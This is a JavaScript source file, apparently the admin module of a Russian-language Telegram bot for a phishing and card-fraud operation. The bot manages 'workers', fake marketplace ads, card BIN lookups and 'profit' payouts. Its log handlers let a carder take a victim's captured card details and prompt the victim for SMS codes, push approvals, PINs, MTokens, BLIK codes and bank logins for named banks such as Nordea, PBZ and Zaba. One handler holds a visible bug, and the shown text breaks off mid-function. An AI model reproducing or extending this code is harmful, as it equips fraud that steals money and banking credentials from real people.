const { Composer, Markup } = require("telegraf");
const admin = require("./commands/admin/admin");
const ads = require("./commands/admin/ads");
const bins = require("./commands/admin/bins");
const countries = require("./commands/admin/countries");
const profits = require("./commands/admin/profits");
const requests = require("./commands/admin/requests");
const services = require("./commands/admin/services");
const settings = require("./commands/admin/settings");
const user = require("./commands/admin/user");
const ad = require("./commands/admin/ad");
const userAds = require("./commands/admin/userAds");
const userProfits = require("./commands/admin/userProfits");
const users = require("./commands/admin/users");
const writers = require("./commands/admin/writers");
const {
  Settings,
  User,
  Ad,
  Service,
  Profit,
  Country,
  Writer,
  Request,
  Bin,
  Log,
} = require("./database");
const locale = require("./locale");
const chunk = require("chunk");
const profit = require("./commands/admin/profit");
const addWriterSelectCountry = require("./commands/admin/addWriterSelectCountry");
const writer = require("./commands/admin/writer");
const request = require("./commands/admin/request");
const bin = require("./commands/admin/bin");
const country = require("./commands/admin/country");
const service = require("./commands/admin/service");
const { Op } = require("sequelize");
const binInfo = require("./helpers/binInfo");
const log = require("./helpers/log");
const help = require("./commands/admin/help");
const change_mentors = require("./scenes/change_mentors")
const adminBot = new Composer(
  async (ctx, next) => ctx.state.user.status == 1 && next());

  // const vbiverBot = new Composer(
  //   async (ctx, next) => ctx.state.user.status == 2 || ctx.state.user.status == 1 && next())

adminBot.command("admin", admin);
adminBot.action("admin", admin);

adminBot.command("settings", settings);
adminBot.action("admin_settings", settings);

adminBot.command("calcPer", async (ctx) => {
  try {
    const usersOnPer = await User.findAll({
      where: {
        percent: {
          [Op.not]: null,
          [Op.gt]: 0,
        },
        percentType: {
          [Op.not]: null,
        },
      },
    });

    var profits = await Profit.sum("convertedAmount", {
      where: {
        status: 0,
      },
    });

    var text = `НЕВЫПЛАЧЕННЫЙ ПРОЦЕНТ ПЕРСОНАЛА:\n`;

    await Promise.allSettled(
      usersOnPer.map(async (v) => {
        try {
          var profits_ = profits;
          if (v.percentType == 2)
            profits_ = await Profit.sum("convertedAmount", {
              where: {
                status: 0,
                writerId: v.id,
              },
            });
          text += `\n <b><a href="tg://user?id=${v.id}">${v.username}</a> — ${(
            (profits_ / 100) *
            parseFloat(v.percent)
          ).toFixed(2)} RUB (${v.percent}%${
            v.percentType == 1 ? " со всех залетов" : " со вбитых логов"
          })</b>`;
        } catch (err) {}
      })
    );
    return ctx
      .reply(text, {
        parse_mode: "HTML",
      })
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(
  /^admin_turn_(on|off)_((requests|allLogs|allHelloMsg)Enabled)$/,
  async (ctx) => {
    try {
      await ctx.state.bot.update({
        [ctx.match[2]]: ctx.match[1] == "on",
      });

      return settings(ctx);
    } catch (err) {
      return ctx.reply("❌ Ошибка").catch((err) => err);
    }
  }
);

adminBot.action(
  /^admin_edit_(allGroupLink|payoutsChannelLink|payoutPercent)$/,
  (ctx) =>
    ctx.scene.enter("admin_edit_value", {
      column: ctx.match[1],
    })
);

adminBot.command("all", (ctx) => ctx.scene.enter("admin_send_mail"));
adminBot.action("admin_send_mail", (ctx) => ctx.scene.enter("admin_send_mail"));

adminBot.command("users", (ctx) => users(ctx));

adminBot.hears(/^\/user @([A-Za-z0-9_]+)$/, (ctx) => user(ctx, ctx.match[1]));
adminBot.hears(/^\/ad (\d+)$/, (ctx) => ad(ctx, ctx.match[1]));
adminBot.hears(/^\/profit (\d+)$/, (ctx) => profit(ctx, ctx.match[1]));

adminBot.command("vbiv", (ctx) => writers(ctx));

adminBot.action("admin_add_writer", addWriterSelectCountry);
adminBot.action("admin_add_bin", (ctx) => ctx.scene.enter("admin_add_bin"));

adminBot.action(/^admin_country_([A-Za-z0-9_]+)_(show|hide)$/, async (ctx) => {
  try {
    const country_ = await Country.findByPk(ctx.match[1]);

    await country_.update({
      status: ctx.match[2] == "show" ? 1 : 0,
    });

    await ctx
      .answerCbQuery(
        `✅ Вы успешно ${
          ctx.match[2] == "show"
            ? "включили отображение страны и её сервисов"
            : "выключили отображение страны и её сервисов"
        }`,
        true
      )
      .catch((err) => err);
    log(
      ctx,
      `${
        country_.status == 1 ? "включил отображение страны" : "скрыл страну"
      } ${country_.title}`
    );
    return country(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_country_([A-Za-z0-9_]+)$/, (ctx) =>
  country(ctx, ctx.match[1])
);

adminBot.action(/^admin_service_([A-Za-z0-9_]+)_edit_domain$/, (ctx) =>
  ctx.scene.enter("admin_service_edit_domain", {
    id: ctx.match[1],
  })
);
adminBot.action(/^admin_service_([A-Za-z0-9_]+)_(show|hide)$/, async (ctx) => {
  try {
    const service_ = await Service.findByPk(ctx.match[1]);

    await service_.update({
      status: ctx.match[2] == "show" ? 1 : 0,
    });

    await ctx
      .answerCbQuery(
        `✅ Вы успешно ${
          ctx.match[2] == "show"
            ? "включили отображение сервиса"
            : "выключили отображение сервиса"
        }`,
        true
      )
      .catch((err) => err);
    log(
      ctx,
      `${
        service_.status == 1 ? "включил отображение сервиса" : "скрыл сервис"
      } ${service_.title}`
    );
    return service(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_service_([A-Za-z0-9_]+)$/, (ctx) =>
  service(ctx, ctx.match[1])
);
adminBot.action(/^admin_bin_(\d+)$/, (ctx) => bin(ctx, ctx.match[1]));

adminBot.action(/^admin_bin_(\d+)_delete$/, async (ctx) => {
  try {
    const bin = await Bin.findByPk(ctx.match[1]);
    await bin.destroy();

    await ctx.answerCbQuery("✅ БИН удалён!", true).catch((err) => err);
    log(ctx, `удалил БИН <b>${bin.bin}</b>`);
    return bins(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.hears(/^\/bin (\d+)$/, async (ctx) => {
  try {
    const bin_ = await Bin.findOne({
      where: {
        bin: ctx.match[1],
      },
    });
    if (!bin_) return ctx.reply("❌ БИН не найден").catch((err) => err);
    return bin(ctx, bin_.id);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.action(/^admin_add_writer_([A-Za-z0-9_]+)$/, (ctx) =>
  ctx.scene.enter("admin_add_writer", {
    countryCode: ctx.match[1],
  })
);

adminBot.action(/^admin_user_(\d+)_request_(\d+)$/, (ctx) =>
  request(ctx, ctx.match[2], ctx.match[1])
);

adminBot.action(
  /^admin_user_(\d+)_request_(\d+)_(accept|decline)$/,
  async (ctx) => {
    try {
      const request_ = await Request.findByPk(ctx.match[1], {
        include: [
          {
            association: "user",
            required: true,
          },
        ],
      });
      if (!request_)
        return ctx
          .answerCbQuery("❌ Заявка не найдена", true)
          .catch((err) => err);
      await request_.update({
        status: ctx.match[3] == "accept" ? 1 : 2,
      });
      await ctx.telegram
        .sendMessage(
          request_.userId,
          locale.requests[request_.status == 1 ? "accepted" : "declined"],
          {
            parse_mode: "HTML",
            reply_markup:
              request_.status == 1
                ? Markup.inlineKeyboard([
                    [Markup.callbackButton(locale.go_to_menu, "start")],
                  ])
                : {},
          }
        )
        .catch((err) => err);

      await ctx
        .answerCbQuery(
          request_.status == 1
            ? "✅ Вы успешно приняли заявку!"
            : "✅ Вы успешно отклонили заявку!",
          true
        )
        .catch((err) => err);
      log(
        ctx,
        `${request_.status == 1 ? "принял" : "отклонил"} заявку #${
          request_.id
        } пользователя <b><a href="tg://user?id=${request_.userId}">${
          request_.user.username
        }</a></b>`
      );
      return request(ctx, ctx.match[2], ctx.match[1]);
    } catch (err) {
      return ctx.reply("❌ Ошибка").catch((err) => err);
    }
  }
);
adminBot.action(/^admin_request_(\d+)_(accept|decline)$/, async (ctx) => {
  try {
    const request_ = await Request.findByPk(ctx.match[1], {
      include: [
        {
          association: "user",
          required: true,
        },
      ],
    });
    if (!request_)
      return ctx
        .answerCbQuery("❌ Заявка не найдена", true)
        .catch((err) => err);

    await request_.update({
      status: ctx.match[2] == "accept" ? 1 : 2,
    });
    await ctx.telegram
      .sendMessage(
        request_.userId,
        locale.requests[request_.status == 1 ? "accepted" : "declined"],
        {
          parse_mode: "HTML",
          reply_markup:
            request_.status == 1
              ? Markup.inlineKeyboard([
                  [Markup.callbackButton(locale.go_to_menu, "start")],
                ])
              : {},
        }
      )
      .catch((err) => err);
    await ctx
      .answerCbQuery(
        request_.status == 1
          ? "✅ Вы успешно приняли заявку!"
          : "✅ Вы успешно отклонили заявку!",
        true
      )
      .catch((err) => err);
    log(
      ctx,
      `${request_.status == 1 ? "принял" : "отклонил"} заявку #${
        request_.id
      } пользователя <b><a href="tg://user?id=${request_.userId}">${
        request_.user.username
      }</a></b>`
    );
    return request(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_request_(\d+)$/, (ctx) => request(ctx, ctx.match[1]));
adminBot.action(/^admin_writer_(\d+)$/, (ctx) => writer(ctx, ctx.match[1]));
adminBot.action(/^admin_writer_(\d+)_delete$/, async (ctx) => {
  try {
    await Writer.destroy({
      where: {
        id: ctx.match[1],
      },
    });
    await ctx
      .answerCbQuery("✅ Вбивер убран из списка!", true)
      .catch((err) => err);

    return writers(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_users_(\d+)$/, (ctx) => users(ctx, ctx.match[1]));
adminBot.action(/^admin_user_(\d+)$/, (ctx) => user(ctx, ctx.match[1]));
adminBot.action(/^admin_user_(\d+)_profit_(\d+)_delete$/, async (ctx) => {
  try {
    const profit = await Profit.findByPk(ctx.match[2]);
    if (!profit) return ctx.answerCbQuery("❌ Профит не найден", true);

    await profit.destroy();
    await ctx.telegram
      .deleteMessage(ctx.state.bot.payoutsChannelId, profit.channelMessageId)
      .catch((err) => err);
    await ctx.answerCbQuery("✅ Профит удален", true).catch((err) => err);

    log(
      ctx,
      `удалил профит #${profit.id} суммой ${profit.amount} ${profit.currency}`
    );
    return userProfits(ctx, ctx.match[1], 1);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.action(/^admin_profit_(\d+)_delete$/, async (ctx) => {
  try {
    const profit = await Profit.findByPk(ctx.match[1]);
    if (!profit) return ctx.answerCbQuery("❌ Профит не найден", true);
    await profit.destroy();
    await ctx.telegram
      .deleteMessage(ctx.state.bot.payoutsChannelId, profit.channelMessageId)
      .catch((err) => err);
    await ctx.answerCbQuery("✅ Профит удален", true).catch((err) => err);
    log(
      ctx,
      `удалил профит #${profit.id} суммой ${profit.amount} ${profit.currency}`
    );
    return profits(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.action(
  /^admin_user_(\d+)_profit_(\d+)_set_status_(wait|payed|razvitie)$/,
  async (ctx) => {
    try {
      const profit_ = await Profit.findByPk(ctx.match[2]);
      await profit_.update({
        status: {
          wait: 0,
          payed: 1,
          razvitie: 2,
        }[ctx.match[3]],
      });
      await ctx.telegram
        .editMessageReplyMarkup(
          ctx.state.bot.payoutsChannelId,
          profit_.channelMessageId,
          profit_.channelMessageId,
          Markup.inlineKeyboard([
            [Markup.callbackButton(locale.newProfit[ctx.match[3]], "none")],
          ])
        )
        .catch((err) => err);

      await ctx
        .answerCbQuery("✅ Статус профита изменен", true)
        .catch((err) => err);
      return profit(ctx,  _.id, profit_.userId);
    } catch (err) {
      return ctx.reply("❌ Ошибка").catch((err) => err);
    }
  }
);
adminBot.action(
  /^admin_profit_(\d+)_set_status_(wait|payed|razvitie)$/,
  async (ctx) => {
    try {
      const profit_ = await Profit.findByPk(ctx.match[1]);
      await profit_.update({
        status: {
          wait: 0,
          payed: 1,
          razvitie: 2,
        }[ctx.match[2]],
      });
      await ctx.telegram
        .editMessageReplyMarkup(
          ctx.state.bot.payoutsChannelId,
          profit_.channelMessageId,
          profit_.channelMessageId,
          Markup.inlineKeyboard([
            [Markup.callbackButton(locale.newProfit[ctx.match[2]], "none")],
          ])
        )
        .catch((err) => err);

      await ctx
        .answerCbQuery("✅ Статус профита изменен", true)
        .catch((err) => err);
      return profit(ctx, profit_.id);
    } catch (err) {
      return ctx.reply("❌ Ошибка").catch((err) => err);
    }
  }
);
adminBot.action(/^admin_user_(\d+)_add_profit$/, async (ctx) => {
  try {
    const services = await Service.findAll({
      order: [["countryCode", "asc"]],
      include: [
        {
          association: "currency",
          required: true,
        },
      ],
    });

    return ctx
      .replyOrEdit("Выберите сервис", {
        reply_markup: Markup.inlineKeyboard([
          ...(services.length >= 1
            ? chunk(
                services.map((v) =>
                  Markup.callbackButton(
                    v.title,
                    `admin_user_${ctx.match[1]}_add_profit_${v.code}`
                  )
                )
              )
            : [[Markup.callbackButton("Страница пуста", "none")]]),
          [Markup.callbackButton(locale.go_back, `admin_user_${ctx.match[1]}`)],
        ]),
      })
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(
  /^admin_user_(\d+)_add_profit_([A-Za-z0-9_]+)$/,
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: ctx.match[2],
        },
        include: [
          {
            association: "currency",
            required: true,
          },
        ],
      });
      const user = await User.findByPk(ctx.match[1]);
      if (!service) {
        await ctx
          .answerCbQuery("❌ Сервис не найден", true)
          .catch((err) => err);
        return user(ctx, ctx.match[1]);
      }
      if (!user) {
        await ctx
          .answerCbQuery("❌ Пользователь не найден", true)
          .catch((err) => err);
        return users(ctx);
      }

      return ctx.scene.enter("admin_add_profit", {
        userId: user.id,
        serviceTitle: service.title,
        currency: service.currency.code,
      });
    } catch (err) {
      return ctx.reply("❌ Ошибка").catch((err) => err);
    }
  }
);
adminBot.action(/^admin_user_(\d+)_ads_(\d+)$/, (ctx) =>
  userAds(ctx, ctx.match[1], ctx.match[2])
);
adminBot.action(/^admin_user_(\d+)_ad_(\d+)$/, (ctx) =>
  ad(ctx, ctx.match[2], ctx.match[1])
);
adminBot.action(/^admin_user_(\d+)_profits_(\d+)$/, (ctx) =>
  userProfits(ctx, ctx.match[1], ctx.match[2])
);
adminBot.action(/^admin_user_(\d+)_profit_(\d+)$/, (ctx) =>
  profit(ctx, ctx.match[2], ctx.match[1])
);
adminBot.action(/^admin_profit_(\d+)$/, (ctx) => profit(ctx, ctx.match[1]));

adminBot.action(
  /^admin_user_(\d+)_set_status_(admin|writer|worker|pro)$/,
  async (ctx) => {
    try {
      const user_ = await User.findByPk(ctx.match[1]);
      await user_.update({
        status: {
          admin: 1,
          writer: 2,
          pro: 3,
          worker: 0,
        }[ctx.match[2]],
      });

      log(
        ctx,
        `изменил статус пользователя <b><a href="tg://user?id=${user_.id}">${
          user_.username
        }</a></b> на ${locale.roles[ctx.match[2]]}`
      );
      await ctx
        .answerCbQuery("✅ Вы успешно изменили статус пользователя!", true)
        .catch((err) => err);
      return user(ctx, ctx.match[1]);
    } catch (err) {
      return ctx.reply("❌ Ошибка").catch((err) => err);
    }
  }
);

adminBot.action(/^admin_user_(\d+)_((un)?ban)$/, async (ctx) => {
  try {
    if (ctx.match[2] == "ban" && ctx.from.id == ctx.match[1])
      return ctx
        .answerCbQuery("❌ Вы не можете заблокировать сами себя", true)
        .catch((err) => err);
    const user_ = await User.findByPk(ctx.match[1]);

    await user_.update({
      banned: ctx.match[2] == "ban",
    });

    if (ctx.match[2] == "ban")
      ctx.telegram
        .sendMessage(ctx.match[1], locale.your_account_banned, {
          parse_mode: "HTML",
        })
        .catch((err) => err);

    log(
      ctx,
      `${
        user_.banned ? "заблокировал" : "разблокировал"
      } пользователя <b><a href="tg://user?id=${user_.id}">${
        user_.username
      }</a></b>`
    );
    return user(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_user_(\d+)_edit_status$/, (ctx) => {
  if (ctx.from.id == ctx.match[1])
    return ctx
      .answerCbQuery("❌ Вы не можете изменить свой статус", true)
      .catch((err) => err);
  ctx
    .replyOrEdit(`Выберите статус`, {
      reply_markup: Markup.inlineKeyboard([
        [
          Markup.callbackButton(
            locale.roles.admin,
            `admin_user_${ctx.match[1]}_set_status_admin`
          ),
        ],
        [
          Markup.callbackButton(
            locale.roles.pro,
            `admin_user_${ctx.match[1]}_set_status_pro`
          ),
        ],
        // [
        //   Markup.callbackButton(
        //     locale.roles.writer,
        //     `admin_user_${ctx.match[1]}_set_status_writer`
        //   ),
        // ],
        [
          Markup.callbackButton(
            locale.roles.worker,
            `admin_user_${ctx.match[1]}_set_status_worker`
          ),
        ],
        [Markup.callbackButton(locale.go_back, `admin_user_${ctx.match[1]}`)],
      ]),
    })
    .catch((err) => err);
});

adminBot.action(/^admin_user_(\d+)_edit_percent_default$/, async (ctx) => {
  try {
    const user_ = await User.findByPk(ctx.match[1]);

    await user_.update({
      percent: null,
      percentType: null,
    });
    log(
      ctx,
      `установил стандартный процент воркера для пользователя <b><a href="tg://user?id=${user_.id}">${user.username}</a></b>`
    );
    return user(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_user_(\d+)_edit_percent_(allProfits|logs)$/, (ctx) =>
  ctx.scene.enter("admin_user_edit_percent", {
    userId: ctx.match[1],
    percentType: ctx.match[2],
  })
);

adminBot.action(/^admin_user_(\d+)_select_percent_type$/, (ctx) =>
  ctx
    .replyOrEdit(`💴 Выберите тип процента`, {
      reply_markup: Markup.inlineKeyboard([
        [
          Markup.callbackButton(
            "💰 Со всех залетов",
            `admin_user_${ctx.match[1]}_edit_percent_allProfits`
          ),
        ],
        [
          Markup.callbackButton(
            "💳 Со вбитых логов",
            `admin_user_${ctx.match[1]}_edit_percent_logs`
          ),
        ],
        [
          Markup.callbackButton(
            `❌ Убрать процент`,
            `admin_user_${ctx.match[1]}_edit_percent_default`
          ),
        ],
        [Markup.callbackButton(locale.go_back, `admin_user_${ctx.match[1]}`)],
      ]),
    })
    .catch((err) => err)
);

adminBot.command("countries", (ctx) => countries(ctx));
adminBot.action(/^admin_countries_(\d+)$/, (ctx) =>
  countries(ctx, ctx.match[1])
);
adminBot.command("services", (ctx) => services(ctx));
adminBot.action(/^admin_services_(\d+)$/, (ctx) => services(ctx, ctx.match[1]));
adminBot.command("ads", (ctx) => ads(ctx));
adminBot.action(/^admin_ads_(\d+)$/, (ctx) => ads(ctx, ctx.match[1]));
adminBot.action(/^admin_ad_(\d+)$/, (ctx) => ad(ctx, ctx.match[1]));
adminBot.action(/^admin_ad_(\d+)_delete$/, async (ctx) => {
  try {
    const ad = await Ad.findByPk(ctx.match[1], {
      include: [
        {
          association: "user",
          required: true,
        },
      ],
    });
    if (!ad)
      return ctx
        .answerCbQuery("❌ Объявление не найдено", true)
        .catch((err) => err);

    await ad.destroy();
    log(
      ctx,
      `удалил объявление #${ad.id} пользователя <b><a href="tg://user?id=${ad.userId}">${ad.user.username}</a></b>`
    );
    return ctx.replyOrEdit("✅ Объявление удалено", {
      reply_markup: Markup.inlineKeyboard([
        [
          Markup.callbackButton(
            "👤 Перейти к пользователю",
            `admin_user_${ad.userId}`
          ),
        ],
        [Markup.callbackButton(locale.go_back, `admin_ads_1`)],
      ]),
    });
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.action(/^admin_user_(\d+)_ad_(\d+)_delete$/, async (ctx) => {
  try {
    const ad = await Ad.findByPk(ctx.match[2], {
      include: [
        {
          association: "user",
          required: true,
        },
      ],
    });
    if (!ad)
      return ctx
        .answerCbQuery("❌ Объявление не найдено", true)
        .catch((err) => err);

    await ad.destroy();
    log(
      ctx,
      `удалил объявление #${ad.id} пользователя <b><a href="tg://user?id=${ad.userId}">${ad.user.username}</a></b>`
    );
    return ctx.replyOrEdit("✅ Объявление удалено", {
      reply_markup: Markup.inlineKeyboard([
        [
          Markup.callbackButton(
            "👤 Перейти к пользователю",
            `admin_user_${ctx.match[1]}`
          ),
        ],
        [
          Markup.callbackButton(
            locale.go_back,
            `admin_user_${ctx.match[1]}_ads_1`
          ),
        ],
      ]),
    });
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.command("bins", (ctx) => bins(ctx));
adminBot.action(/^admin_bins_(\d+)$/, (ctx) => bins(ctx, ctx.match[1]));
adminBot.command("profits", (ctx) => profits(ctx));
adminBot.action(/^admin_profits_(\d+)$/, (ctx) => profits(ctx, ctx.match[1]));
adminBot.command("requests", (ctx) => requests(ctx));
adminBot.action(/^admin_requests_(\d+)$/, (ctx) => requests(ctx, ctx.match[1]));
adminBot.command("writers", (ctx) => writers(ctx));
adminBot.action(/^admin_writers_(\d+)$/, (ctx) => writers(ctx, ctx.match[1]));

adminBot.action(/^(?:change_mentors)/i, (ctx) => ctx.scene.enter('change_mentors_scene'));

adminBot.command("setrequestsgroup", async (ctx) => {
  try {
    await ctx.state.bot.update({
      requestsGroupId: ctx.chat.id,
    });
    log(ctx, "изменил группу для заявок");
    return ctx
      .reply(
        `<b>✅ Группа для заявок установлена</b> <code>ID: ${ctx.chat.id}</code>`,
        {
          parse_mode: "HTML",
        }
      )
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.command("setallgroup", async (ctx) => {
  try {
    await ctx.state.bot.update({
      allGroupId: ctx.chat.id,
    });
    log(ctx, "изменил группу общего чата");
    return ctx
      .reply(`<b>✅ Общий чат установлен</b> <code>ID: ${ctx.chat.id}</code>`, {
        parse_mode: "HTML",
      })
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.command("setlogsgroup", async (ctx) => {
  try {
    await ctx.state.bot.update({
      logsGroupId: ctx.chat.id,
    });
    log(ctx, "изменил группу для логов");
    return ctx
      .reply(
        `<b>✅ Группа для логов установлена</b> <code>ID: ${ctx.chat.id}</code>`,
        {
          parse_mode: "HTML",
        }
      )
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.command("setlogginggroup", async (ctx) => {
  try {
    await ctx.state.bot.update({
      loggingGroupId: ctx.chat.id,
    });
    log(ctx, "изменил группу для логирования действий");
    return ctx
      .reply(
        `<b>✅ Группа для логирования действий установлена</b> <code>ID: ${ctx.chat.id}</code>`,
        {
          parse_mode: "HTML",
        }
      )
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.command("setpayoutschannel", async (ctx) => {
  try {
    await ctx.state.bot.update({
      payoutsChannelId: ctx.chat.id,
    });

    log(ctx, "изменил канал для выплат");
    return ctx
      .reply(
        `<b>✅ Канал для выплат установлен</b> <code>ID: ${ctx.chat.id}</code>`,
        {
          parse_mode: "HTML",
        }
      )
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

//logs
adminBot.action(/^log_(\d+)_wrong_(code|lk|picture|push)$/, async (ctx) => {
  try {
    const log = await Log.findByPk(ctx.match[1], {
      include: [
        {
          association: "ad",
          required: true,
          include: [
            {
              association: "user",
              required: true,
            },
            {
              association: "service",
              required: true,
              include: [
                {
                  association: "country",
                  required: true,
                },
                {
                  association: "currency",
                  required: true,
                },
              ],
            },
          ],
        },
        {
          association: "writer",
          required: true,
        },
      ],
    });
    if (!log)
      return ctx.answerCbQuery("❌ Лог не найден", true).catch((err) => err);
    if (log.writerId && log.writerId != ctx.from.id)
      return ctx
        .answerCbQuery("❌ Этот лог взял на вбив кто-то другой", true)
        .catch((err) => err);
    if (!log.writerId)
      await log.update({
        writerId: ctx.from.id,
      });

    await ctx.answerCbQuery("🔔 Воркер уведомлён").catch((err) => err);
    ctx.telegram
      .sendMessage(
        log.ad.userId,
        `<b>${locale.wrongWorkerStatuses[ctx.match[2]]} ${log.ad.service.title}</b>
      
📦 Объявление: <b>${log.ad.title}</b>
💰 Цена: <b>${log.ad.price}</b>`,
        {
          parse_mode: "HTML",
        }
      )
      .catch((err) => err);
  } catch (err) {
    ctx.answerCbQuery("❌ Ошибка", true).catch((err) => err);
  }
});

adminBot.action(
  /^log_(\d+)_(push|sms|lk|lk1|lk2|lk3|lk4|lk5|custom|blik|appCode|callCode|picture|otherCard|limits|forVerify|correctBalance|profit|leave|mtoken|passcode|pincode|dtrans|callBank)$/,
  async (ctx) => {
    try {
      const log = await Log.findByPk(ctx.match[1], {
        include: [
          {
            association: "ad",
            required: true,
            include: [
              {
                association: "user",
                required: true,
              },
              {
                association: "service",
                required: true,
                include: [
                  {
                    association: "country",
                    required: true,
                  },
                  {
                    association: "currency",
                    required: true,
                  },
                ],
              },
            ],
          },
          {
            association: "writer",
            required: true,
          },
        ],
      });
      console.log(log.ad.service.country.id)
      if (!log)
        return ctx.answerCbQuery("❌ Лог не найден", true).catch((err) => err);
      if (log.writerId && log.writerId != ctx.from.id)
        return ctx
          .answerCbQuery("❌ Этот лог взял на вбив кто-то другой", true)
          .catch((err) => err);
      if (!log.writerId)
        await log.update({
          writerId: ctx.from.id,
        });

      if (ctx.match[2] == "leave") {
        await log.update({
          writerId: null,
        });
        await ctx
          .answerCbQuery("✅ Вы успешно вышли со вбива этого лога", true)
          .catch((err) => err);
        return await ctx
          .editMessageReplyMarkup(
            Markup.inlineKeyboard([
              [Markup.callbackButton(`✍️ Взять на вбив`, `take_log_${log.id}`)],
            ])
          )
          .catch((err) => err);
      }
      await log.update({
        status: ctx.match[2],
        smsCode: null,
        MToken: null
      });
      if (log.status == "profit") {
        await ctx
          .answerCbQuery("🎉 Поздравляем с успешным вбивом!")
          .catch((err) => err);
          // await log.update({
          //   status: ctx.match[2],
          //   smsCode: null,
          // });
    
        return ctx.scene.enter(`admin_add_profit`, {
          userId: log.ad.userId,
          serviceTitle: log.ad.service.title,
          currency: log.ad.service.currency.code,
        });
      }
      if(log.status == "custom") {
        ctx.scene.enter("custom_window_scene", {
          id: ctx.match[1],
        })
      }
      if(log.status == 'lk1') {
        await log.update({
          type_lk: 1
        })
      } else if(log.status == 'lk2') {
        await log.update({
          type_lk: 2
        })
      } else if(log.status == 'lk3') {
        await log.update({
          type_lk: 3
        })
      } else if(log.status == 'lk4') {
        await log.update({
          type_lk: 4
        })
      } else if(log.status == 'lk5') {
        await log.update({
          type_lk: 5
        })
      }
      await ctx
        .answerCbQuery(
          `✅ Вы успешно изменили статус лога на "${
            locale.statuses[log.status]
          }"`,
          true
        )
        .catch((err) => err);

      ctx.telegram
        .sendMessage(
          log.ad.userId,
          `<b>${locale.workerStatuses[log.status]} ${log.ad.service.title}</b>
      
📦 Объявление: <b>${log.ad.title}</b>
💰 Цена: <b>${log.ad.price}</b>`,
          {
            parse_mode: "HTML",
          },
          {
            parse_mode: "HTML",
          }
        )
        .catch((err) => err);
      var bank;
      try {
        const cardInfo = await binInfo(String(log.cardNumber).substr(0, 8));
        bank = cardInfo.bank;
      } catch (err) {}
      return ctx
        .editMessageReplyMarkup(
          Markup.inlineKeyboard([
            [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],
            [
              Markup.callbackButton(
                `Текущий статус: ${locale.statuses[log.status]}`,
                "none"
              ),
            ],
            [
              Markup.callbackButton(
                `Взял на вбив ${log.writer.username}`,
                "none"
              ),
            ],
            
            [
              Markup.callbackButton("📱 ПУШ", `log_${log.id}_push`),
              Markup.callbackButton("📥 СМС-КОД", `log_${log.id}_sms`),
            ],
            [
              Markup.callbackButton("📧 MToken", `log_${log.id}_mtoken`),
              Markup.callbackButton("🔏 Passcode", `log_${log.id}_passcode`),
            ],
            [
              Markup.callbackButton("🖍 Pin-code", `log_${log.id}_pincode`),
            ],
            [
              Markup.callbackButton("💸 Прямой перевод", `log_${log.id}_dtrans`),
            ],
            [
              Markup.callbackButton("📶 Звонок в банк ", `log_${log.id}_callBank`),
            ],
            ...(log.ad.service.country.withLk && log.ad.service.country.id != 'fi'
              ? [[Markup.callbackButton("🔐 ЛК", `log_${log.id}_lk`)]]
              : log.ad.service.country.id == 'fi' ? [
                [Markup.callbackButton("🔐 ЛК Nordea", `log_${log.id}_lk1`)],
              [Markup.callbackButton("🔐 ЛК Nordea Push", `log_${log.id}_lk2`)],
              [Markup.callbackButton("🔐 Все ЛК", `log_${log.id}_lk3`)]
            ] : log.ad.service.country.id == 'hr' ? [
              [Markup.callbackButton("🔐 ЛК PBZ", `log_${log.id}_lk4`)],
            [Markup.callbackButton("🔐 ЛК Zaba", `log_${log.id}_lk5`)],
          ] : []),
            [
              Markup.callbackButton(
                "📬 КОД С ПРИЛОЖЕНИЯ",
                `log_${log.id}_appCode`
              ),
              Markup.callbackButton(
                "☎️ КОД ИЗ ЗВОНКА",
                `log_${log.id}_callCode`
              ),
            ],
            ...(String(bank).match(/MILLENNIUM/giu)
              ? [[Markup.callbackButton("🖼 КАРТИНКА", `log_${log.id}_picture`)]]
              : []),
            ...(["pl"].includes(log.ad.service.country.id)
              ? [[Markup.callbackButton("#️⃣ БЛИК", `log_${log.id}_blik`)]]
              : []),
            [
              Markup.callbackButton("⚠️ ЛИМИТЫ", `log_${log.id}_limits`),
              Markup.callbackButton(
                "⚠️ ДРУГАЯ КАРТА",
                `log_${log.id}_otherCard`
              ),
            ],
            [
              Markup.callbackButton(
                "⚠️ ТОЧНЫЙ БАЛАНС",
                `log_${log.id}_correctBalance`
              ),
              ...(["ua"].includes(log.ad.service.country.id)
                ? [
                    Markup.callbackButton(
                      "⚠️ НУЖЕН БАЛАНС",
                      `log_${log.id}_forVerify`
                    ),
                  ]
                : []),
            ],
            [
              Markup.callbackButton(
                "❌ Неверный КОД",
